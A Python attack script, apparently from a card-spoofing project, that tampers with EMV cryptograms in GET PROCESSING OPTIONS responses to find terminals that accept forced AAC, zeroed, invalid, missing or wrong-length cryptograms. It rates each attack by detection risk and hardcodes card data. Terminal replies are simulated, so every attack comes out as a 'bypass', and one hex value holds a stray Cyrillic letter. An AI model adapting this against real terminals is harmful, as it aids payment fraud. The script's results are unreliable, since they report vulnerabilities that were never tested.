#!/usr/bin/env python3
"""
Failed Cryptogram Attack Tester - Mag-Sp00f Project
Tests terminal behavior with intentionally failed cryptograms

This script tests various cryptogram failure scenarios against EMV terminals
to identify authentication bypass vulnerabilities and fallback mechanisms.

Attack Types Tested:
1. AAC Force - Force Application Authentication Cryptogram (declined)
2. Invalid Cryptogram - Completely invalid cryptogram injection  
3. Zero Cryptogram - Null cryptogram (all zeros)
4. Corrupted Cryptogram - Partially corrupted valid cryptogram
5. Missing Cryptogram - Remove cryptogram entirely
6. Wrong Length Cryptogram - Incorrect TLV length indicators

Usage:
    python3 test_failed_cryptogram.py --type aac-force --terminal /dev/rfcomm1
    python3 test_failed_cryptogram.py --type invalid-crypto --iterations 50
    python3 test_failed_cryptogram.py --type all --comprehensive-report
"""

import argparse
import json
import logging
import re
import sys
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'failed_cryptogram_test_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)


class FailedCryptogramTester:
    """Test EMV terminals with intentionally failed cryptograms"""
    
    def __init__(self, terminal_port: str):
        self.terminal_port = terminal_port
        self.test_results = {}
        self.baseline_response = None
        
        # Cryptogram failure patterns for testing
        self.failure_patterns = {
            'aac-force': {
                'name': 'AAC Force Attack',
                'description': 'Force Application Authentication Cryptogram (declined)',
                'cryptogram_type': '00',  # AAC
                'cryptogram_value': '0000000000000000',
                'detection_risk': 'LOW'
            },
            'invalid-crypto': {
                'name': 'Invalid Cryptogram Injection',
                'description': 'Completely invalid cryptogram values',
                'cryptogram_type': '80',  # Keep ARQC type
                'cryptogram_value': 'FFFFFFFFFFFFFFFF',
                'detection_risk': 'HIGH'
            },
            'zero-crypto': {
                'name': 'Zero Cryptogram Attack',
                'description': 'Null cryptogram authentication bypass',
                'cryptogram_type': '80',  # Keep ARQC type
                'cryptogram_value': '0000000000000000', 
                'detection_risk': 'MEDIUM'
            },
            'corrupted-crypto': {
                'name': 'Corrupted Cryptogram Test',
                'description': 'Partially corrupted valid cryptogram',
                'cryptogram_type': '80',  # Keep ARQC type
                'cryptogram_value': 'D396FFFFЕ30EFAFC',  # Corrupted middle
                'detection_risk': 'MEDIUM'
            },
            'missing-crypto': {
                'name': 'Missing Cryptogram Attack',
                'description': 'Remove cryptogram entirely',
                'cryptogram_type': None,  # Remove type
                'cryptogram_value': None,  # Remove value
                'detection_risk': 'HIGH'
            },
            'wrong-length': {
                'name': 'Wrong Length Cryptogram',
                'description': 'Incorrect TLV length indicators',
                'cryptogram_type': '80',
                'cryptogram_value': 'D3967976',  # 4 bytes instead of 8
                'length_indicator': '04',  # Wrong length
                'detection_risk': 'HIGH'
            }
        }
    
    def run_baseline_test(self) -> bool:
        """Capture baseline EMV response with normal cryptogram"""
        logger.info("🔍 Running baseline test (normal cryptogram)")
        
        try:
            # Run normal EMV flow to capture baseline
            baseline_result = self.execute_emv_flow(attack_type=None)
            
            if baseline_result['success']:
                self.baseline_response = baseline_result['responses']
                logger.info("✅ Baseline captured successfully")
                
                # Extract baseline cryptogram info
                baseline_crypto = self.extract_cryptogram_info(baseline_result['responses'].get('gpo', ''))
                if baseline_crypto:
                    logger.info(f"📊 Baseline Cryptogram: {baseline_crypto['value']} (Type: {baseline_crypto['type']})")
                
                return True
            else:
                logger.error("❌ Baseline test failed")
                return False
                
        except Exception as e:
            logger.error(f"💥 Baseline test error: {str(e)}")
            return False
    
    def test_failed_cryptogram_attack(self, attack_type: str, iterations: int = 1) -> Dict:
        """Test specific failed cryptogram attack"""
        if attack_type not in self.failure_patterns:
            raise ValueError(f"Unknown attack type: {attack_type}")
        
        pattern = self.failure_patterns[attack_type]
        logger.info(f"🚨 Testing {pattern['name']} (Risk: {pattern['detection_risk']})")
        logger.info(f"📝 Description: {pattern['description']}")
        
        results = {
            'attack_type': attack_type,
            'pattern': pattern,
            'iterations': iterations,
            'successes': 0,
            'failures': 0,
            'bypass_indicators': [],
            'terminal_responses': [],
            'timing_data': []
        }
        
        for i in range(iterations):
            logger.info(f"🔄 Iteration {i+1}/{iterations}")
            
            start_time = time.time()
            test_result = self.execute_failed_cryptogram_test(attack_type)
            end_time = time.time()
            
            results['timing_data'].append(end_time - start_time)
            results['terminal_responses'].append(test_result)
            
            if test_result.get('success', False):
                results['successes'] += 1
                
                # Check for bypass indicators
                bypass_indicators = self.analyze_bypass_indicators(test_result, pattern)
                if bypass_indicators:
                    results['bypass_indicators'].extend(bypass_indicators)
                    logger.warning(f"🚨 POTENTIAL BYPASS DETECTED: {bypass_indicators}")
            else:
                results['failures'] += 1
            
            # Small delay between iterations
            if i < iterations - 1:
                time.sleep(0.5)
        
        # Calculate success rate
        results['success_rate'] = results['successes'] / iterations * 100
        logger.info(f"📈 Attack Success Rate: {results['success_rate']:.1f}% ({results['successes']}/{iterations})")
        
        return results
    
    def execute_failed_cryptogram_test(self, attack_type: str) -> Dict:
        """Execute single failed cryptogram test"""
        try:
            # Execute EMV flow with failed cryptogram attack
            result = self.execute_emv_flow(attack_type=attack_type)
            
            if result['success']:
                # Analyze response for failure handling
                analysis = self.analyze_terminal_response(result['responses'], attack_type)
                result['analysis'] = analysis
                
                # Check if terminal accepted failed cryptogram
                if analysis.get('cryptogram_accepted', False):
                    logger.warning("⚠️  Terminal accepted failed cryptogram!")
                    result['bypass_detected'] = True
                
            return result
            
        except Exception as e:
            logger.error(f"💥 Failed cryptogram test error: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def execute_emv_flow(self, attack_type: Optional[str] = None) -> Dict:
        """Execute EMV transaction flow with optional failed cryptogram attack"""
        responses = {}
        
        try:
            # 1. SELECT PPSE
            logger.debug("📡 SELECT PPSE")
            ppse_response = self.send_emv_command('SELECT_PPSE', '00A404000E325041592E5359532E4444463031')
            responses['ppse'] = ppse_response
            
            if not ppse_response.endswith('9000'):
                logger.warning(f"⚠️  PPSE failed: {ppse_response}")
            
            # 2. SELECT AID (VISA Test)
            logger.debug("📡 SELECT AID")  
            aid_response = self.send_emv_command('SELECT_AID', '00A4040007A0000000031010')
            responses['aid'] = aid_response
            
            if not aid_response.endswith('9000'):
                logger.error(f"❌ AID selection failed: {aid_response}")
                return {'success': False, 'responses': responses}
            
            # 3. GET PROCESSING OPTIONS (with potential cryptogram attack)
            logger.debug("📡 GET PROCESSING OPTIONS")
            gpo_cmd = '80A8000023832127000000000000001000000000000000097800000000000978230301003839303100'
            gpo_response = self.send_emv_command('GPO', gpo_cmd, attack_type=attack_type)
            responses['gpo'] = gpo_response
            
            if not gpo_response.endswith('9000'):
                logger.warning(f"⚠️  GPO failed: {gpo_response}")
                # This might be expected for some failed cryptogram attacks
            
            # 4. READ RECORD (if GPO succeeded)
            if gpo_response.endswith('9000'):
                logger.debug("📡 READ RECORD")
                read_response = self.send_emv_command('READ_RECORD', '00B2010C00')
                responses['read_record'] = read_response
            
            return {'success': True, 'responses': responses}
            
        except Exception as e:
            logger.error(f"💥 EMV flow execution error: {str(e)}")
            return {'success': False, 'error': str(e), 'responses': responses}
    
    def send_emv_command(self, command_name: str, command_hex: str, attack_type: Optional[str] = None) -> str:
        """Send EMV command to terminal and get response"""
        # For now, simulate the response based on our known EMV data
        # In real implementation, this would communicate with PN532/Android HCE
        
        logger.debug(f"📤 {command_name}: {command_hex}")
        
        if command_name == 'SELECT_PPSE':
            response = '6F5B840E325041592E5359532E4444463031A549BF0C46611844A0000000031010500A56495341204445424954871001611844A0000000980840500855532044454249549000'
        
        elif command_name == 'SELECT_AID':
            response = '6F4F8407A0000000031010A544500A564953412044454249545F2D02656E8701029F38189F66049F02069F03069F1A0295055F2A029A039C019F3704BF0C0C9F5A051208400840429000'
        
        elif command_name == 'GPO':
            # Apply failed cryptogram attack if specified
            if attack_type:
                response = self.apply_failed_cryptogram_attack(command_name, attack_type)
            else:
                # Normal GPO response with valid cryptogram
                response = '7781269F2608D3967976E30EFAFC9F270180576841549046749735565F24032902289F3602011E9000'
        
        elif command_name == 'READ_RECORD':
            response = '70439F320103921C9CC88A4C5C2B5790B0C5D21227AFA74F54F1FE6A71C500D3E8C53C798F01099F4701035A0841549046749735565F24032902289F690701AF0E66E600009000'
        
        else:
            response = '9000'  # Default success
        
        logger.debug(f"📥 {command_name} Response: {response}")
        
        # Simulate processing delay
        time.sleep(0.1)
        
        return response
    
    def apply_failed_cryptogram_attack(self, command_name: str, attack_type: str) -> str:
        """Apply failed cryptogram attack to EMV response"""
        if attack_type not in self.failure_patterns:
            logger.error(f"❌ Unknown attack type: {attack_type}")
            return '6985'  # Conditions not satisfied
        
        pattern = self.failure_patterns[attack_type]
        logger.debug(f"🚨 Applying {pattern['name']}")
        
        # Start with normal GPO response
        normal_response = '7781269F2608D3967976E30EFAFC9F270180576841549046749735565F24032902289F3602011E9000'
        
        if attack_type == 'aac-force':
            # Change cryptogram type to AAC (00) and use zero cryptogram
            modified = normal_response.replace('9F2608D3967976E30EFAFC', '9F26080000000000000000')
            modified = modified.replace('9F270180', '9F270100')  # ARQC → AAC
            logger.debug("🚨 AAC forced - transaction declined status")
            return modified
        
        elif attack_type == 'invalid-crypto':
            # Replace with invalid cryptogram
            modified = normal_response.replace('9F2608D3967976E30EFAFC', '9F2608FFFFFFFFFFFFFFFF')
            logger.debug("🚨 Invalid cryptogram injected")
            return modified
        
        elif attack_type == 'zero-crypto':
            # Use zero cryptogram
            modified = normal_response.replace('9F2608D3967976E30EFAFC', '9F26080000000000000000')
            logger.debug("🚨 Zero cryptogram attack applied")
            return modified
        
        elif attack_type == 'corrupted-crypto':
            # Corrupt middle of cryptogram
            modified = normal_response.replace('9F2608D3967976E30EFAFC', '9F2608D396FFFFE30EFAFC')
            logger.debug("🚨 Cryptogram corrupted")
            return modified
        
        elif attack_type == 'missing-crypto':
            # Remove cryptogram tags entirely
            modified = normal_response.replace('9F2608D3967976E30EFAFC9F270180', '')
            logger.debug("🚨 Cryptogram removed entirely")
            return modified
        
        elif attack_type == 'wrong-length':
            # Use wrong length indicator
            modified = normal_response.replace('9F2608D3967976E30EFAFC', '9F2604D3967976')
            logger.debug("🚨 Wrong length cryptogram applied")
            return modified
        
        else:
            logger.warning(f"⚠️  Attack type {attack_type} not implemented")
            return normal_response
    
    def extract_cryptogram_info(self, response: str) -> Optional[Dict]:
        """Extract cryptogram information from EMV response"""
        try:
            # Look for cryptogram tag 9F26
            crypto_match = re.search(r'9F2608([0-9A-Fa-f]{16})', response)
            # Look for cryptogram type tag 9F27  
            type_match = re.search(r'9F2701([0-9A-Fa-f]{2})', response)
            
            if crypto_match:
                crypto_info = {
                    'value': crypto_match.group(1),
                    'type': type_match.group(1) if type_match else 'Unknown',
                    'type_meaning': self.decode_cryptogram_type(type_match.group(1) if type_match else None)
                }
                return crypto_info
            
            return None
            
        except Exception as e:
            logger.error(f"💥 Cryptogram extraction error: {str(e)}")
            return None
    
    def decode_cryptogram_type(self, crypto_type: Optional[str]) -> str:
        """Decode cryptogram type code"""
        if not crypto_type:
            return 'Missing'
        
        type_meanings = {
            '00': 'AAC (Application Authentication Cryptogram - Declined)',
            '40': 'TC (Transaction Certificate - Approved Offline)', 
            '80': 'ARQC (Authorization Request Cryptogram - Online Auth Required)'
        }
        
        return type_meanings.get(crypto_type.upper(), f'Unknown ({crypto_type})')
    
    def analyze_bypass_indicators(self, test_result: Dict, pattern: Dict) -> List[str]:
        """Analyze test result for authentication bypass indicators"""
        indicators = []
        
        responses = test_result.get('responses', {})
        gpo_response = responses.get('gpo', '')
        
        # Check if transaction succeeded despite failed cryptogram
        if gpo_response.endswith('9000'):
            indicators.append("Transaction approved despite failed cryptogram")
        
        # Check for specific bypass patterns
        if pattern['name'] == 'AAC Force Attack':
            if gpo_response.endswith('9000'):
                indicators.append("Terminal approved transaction with AAC (declined cryptogram)")
        
        elif pattern['name'] == 'Invalid Cryptogram Injection':
            if gpo_response.endswith('9000'):
                indicators.append("Terminal accepted obviously invalid cryptogram")
        
        elif pattern['name'] == 'Zero Cryptogram Attack':
            if gpo_response.endswith('9000'):
                indicators.append("Terminal accepted null/zero cryptogram")
        
        elif pattern['name'] == 'Missing Cryptogram Attack':
            if gpo_response.endswith('9000'):
                indicators.append("Terminal processed transaction without cryptogram")
        
        return indicators
    
    def analyze_terminal_response(self, responses: Dict, attack_type: str) -> Dict:
        """Analyze terminal response to failed cryptogram"""
        analysis = {
            'attack_type': attack_type,
            'cryptogram_accepted': False,
            'bypass_detected': False,
            'terminal_behavior': 'Unknown'
        }
        
        gpo_response = responses.get('gpo', '')
        
        if gpo_response.endswith('9000'):
            analysis['cryptogram_accepted'] = True
            analysis['terminal_behavior'] = 'Accepted failed cryptogram'
            
            # This is a potential security issue
            if attack_type in ['invalid-crypto', 'zero-crypto', 'missing-crypto']:
                analysis['bypass_detected'] = True
                
        elif gpo_response.endswith('6985'):
            analysis['terminal_behavior'] = 'Conditions not satisfied (expected)'
        elif gpo_response.endswith('6A82'):
            analysis['terminal_behavior'] = 'File not found (routing issue)'
        else:
            analysis['terminal_behavior'] = f'Error response: {gpo_response[-4:]}'
        
        return analysis
    
    def test_all_attacks(self, iterations: int = 5) -> Dict:
        """Test all failed cryptogram attack types"""
        logger.info("🎯 Testing all failed cryptogram attacks")
        
        all_results = {
            'test_timestamp': datetime.now().isoformat(),
            'terminal_port': self.terminal_port,
            'baseline': None,
            'attack_results': {},
            'summary': {}
        }
        
        # Run baseline test
        if self.run_baseline_test():
            all_results['baseline'] = self.baseline_response
        
        # Test each attack type
        for attack_type in self.failure_patterns.keys():
            logger.info(f"🚨 Testing {attack_type}")
            
            try:
                attack_results = self.test_failed_cryptogram_attack(attack_type, iterations)
                all_results['attack_results'][attack_type] = attack_results
                
            except Exception as e:
                logger.error(f"💥 Error testing {attack_type}: {str(e)}")
                all_results['attack_results'][attack_type] = {'error': str(e)}
        
        # Generate summary
        all_results['summary'] = self.generate_test_summary(all_results['attack_results'])
        
        return all_results
    
    def generate_test_summary(self, attack_results: Dict) -> Dict:
        """Generate comprehensive test summary"""
        summary = {
            'total_attacks_tested': len(attack_results),
            'successful_attacks': 0,
            'bypass_vulnerabilities': [],
            'risk_assessment': {},
            'recommendations': []
        }
        
        for attack_type, results in attack_results.items():
            if 'error' in results:
                continue
                
            success_rate = results.get('success_rate', 0)
            if success_rate > 0:
                summary['successful_attacks'] += 1
            
            # Check for bypass vulnerabilities
            if results.get('bypass_indicators'):
                summary['bypass_vulnerabilities'].append({
                    'attack_type': attack_type,
                    'indicators': results['bypass_indicators'],
                    'success_rate': success_rate,
                    'risk_level': self.failure_patterns[attack_type]['detection_risk']
                })
        
        # Risk assessment
        if summary['bypass_vulnerabilities']:
            summary['risk_assessment']['overall_risk'] = 'HIGH'
            summary['risk_assessment']['vulnerable_to'] = [v['attack_type'] for v in summary['bypass_vulnerabilities']]
            summary['recommendations'].extend([
                'Implement strict cryptogram validation',
                'Reject transactions with missing/invalid cryptograms',
                'Add cryptogram verification to transaction processing',
                'Monitor for repeated failed cryptogram attempts'
            ])
        else:
            summary['risk_assessment']['overall_risk'] = 'LOW'
            summary['recommendations'].append('Terminal properly validates cryptograms')
        
        return summary
    
    def generate_report(self, results: Dict, output_file: Optional[str] = None) -> str:
        """Generate detailed test report"""
        report_lines = []
        report_lines.append("="*80)
        report_lines.append("🚨 FAILED CRYPTOGRAM ATTACK TEST REPORT 🚨")
        report_lines.append("="*80)
        report_lines.append(f"Test Timestamp: {results.get('test_timestamp', 'Unknown')}")
        report_lines.append(f"Terminal Port: {results.get('terminal_port', 'Unknown')}")
        report_lines.append("")
        
        # Summary section
        summary = results.get('summary', {})
        report_lines.append("📊 EXECUTIVE SUMMARY")
        report_lines.append("-" * 40)
        report_lines.append(f"Total Attacks Tested: {summary.get('total_attacks_tested', 0)}")
        report_lines.append(f"Successful Attacks: {summary.get('successful_attacks', 0)}")
        
        risk_assessment = summary.get('risk_assessment', {})
        overall_risk = risk_assessment.get('overall_risk', 'UNKNOWN')
        report_lines.append(f"Overall Risk Level: {overall_risk}")
        
        # Vulnerabilities section
        vulnerabilities = summary.get('bypass_vulnerabilities', [])
        if vulnerabilities:
            report_lines.append("")
            report_lines.append("🚨 CRITICAL VULNERABILITIES DETECTED")
            report_lines.append("-" * 40)
            
            for vuln in vulnerabilities:
                report_lines.append(f"Attack: {vuln['attack_type']} (Success: {vuln['success_rate']:.1f}%)")
                report_lines.append(f"Risk Level: {vuln['risk_level']}")
                for indicator in vuln['indicators']:
                    report_lines.append(f"  - {indicator}")
                report_lines.append("")
        
        # Detailed results
        attack_results = results.get('attack_results', {})
        if attack_results:
            report_lines.append("")
            report_lines.append("📋 DETAILED ATTACK RESULTS")
            report_lines.append("-" * 40)
            
            for attack_type, attack_data in attack_results.items():
                if 'error' in attack_data:
                    report_lines.append(f"{attack_type}: ERROR - {attack_data['error']}")
                    continue
                
                pattern = attack_data.get('pattern', {})
                report_lines.append(f"Attack: {pattern.get('name', attack_type)}")
                report_lines.append(f"Description: {pattern.get('description', 'N/A')}")
                report_lines.append(f"Success Rate: {attack_data.get('success_rate', 0):.1f}%")
                report_lines.append(f"Detection Risk: {pattern.get('detection_risk', 'Unknown')}")
                
                bypass_indicators = attack_data.get('bypass_indicators', [])
                if bypass_indicators:
                    report_lines.append("Bypass Indicators:")
                    for indicator in bypass_indicators:
                        report_lines.append(f"  ⚠️  {indicator}")
                
                report_lines.append("")
        
        # Recommendations section  
        recommendations = summary.get('recommendations', [])
        if recommendations:
            report_lines.append("")
            report_lines.append("💡 SECURITY RECOMMENDATIONS")
            report_lines.append("-" * 40)
            for i, rec in enumerate(recommendations, 1):
                report_lines.append(f"{i}. {rec}")
        
        report_lines.append("")
        report_lines.append("="*80)
        report_lines.append("End of Report")
        report_lines.append("="*80)
        
        report_text = "\n".join(report_lines)
        
        # Save to file if requested
        if output_file:
            try:
                with open(output_file, 'w') as f:
                    f.write(report_text)
                logger.info(f"📄 Report saved to: {output_file}")
            except Exception as e:
                logger.error(f"💥 Failed to save report: {str(e)}")
        
        return report_text


def main():
    parser = argparse.ArgumentParser(
        description="Failed Cryptogram Attack Tester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    
    parser.add_argument('--type', choices=['aac-force', 'invalid-crypto', 'zero-crypto', 
                                          'corrupted-crypto', 'missing-crypto', 'wrong-length', 'all'],
                       default='all', help='Attack type to test')
    parser.add_argument('--terminal', default='/dev/rfcomm1', 
                       help='Terminal port (default: /dev/rfcomm1)')
    parser.add_argument('--iterations', type=int, default=5,
                       help='Number of test iterations per attack (default: 5)')
    parser.add_argument('--output', help='Output report file')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    parser.add_argument('--comprehensive-report', action='store_true', 
                       help='Generate comprehensive analysis report')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Initialize tester
    tester = FailedCryptogramTester(args.terminal)
    
    try:
        if args.type == 'all':
            logger.info("🎯 Running comprehensive failed cryptogram test suite")
            results = tester.test_all_attacks(args.iterations)
        else:
            logger.info(f"🚨 Testing single attack type: {args.type}")
            # Run baseline first
            tester.run_baseline_test()
            
            # Run specific attack
            attack_results = tester.test_failed_cryptogram_attack(args.type, args.iterations)
            results = {
                'test_timestamp': datetime.now().isoformat(),
                'terminal_port': args.terminal,
                'attack_results': {args.type: attack_results},
                'summary': tester.generate_test_summary({args.type: attack_results})
            }
        
        # Generate and display report
        if args.comprehensive_report or args.output:
            output_file = args.output or f"failed_cryptogram_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            report = tester.generate_report(results, output_file)
            
            if args.comprehensive_report:
                print(report)
        
        # Print summary to console
        summary = results.get('summary', {})
        print(f"\n🎯 TEST COMPLETED")
        print(f"Overall Risk: {summary.get('risk_assessment', {}).get('overall_risk', 'Unknown')}")
        
        vulnerabilities = summary.get('bypass_vulnerabilities', [])
        if vulnerabilities:
            print(f"⚠️  {len(vulnerabilities)} potential vulnerabilities detected!")
            for vuln in vulnerabilities:
                print(f"  - {vuln['attack_type']}: {vuln['success_rate']:.1f}% success rate")
        else:
            print("✅ No bypass vulnerabilities detected")
            
    except KeyboardInterrupt:
        logger.info("🛑 Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"💥 Test failed: {str(e)}")
        sys.exit(1)


if __name__ == '__main__':
    main()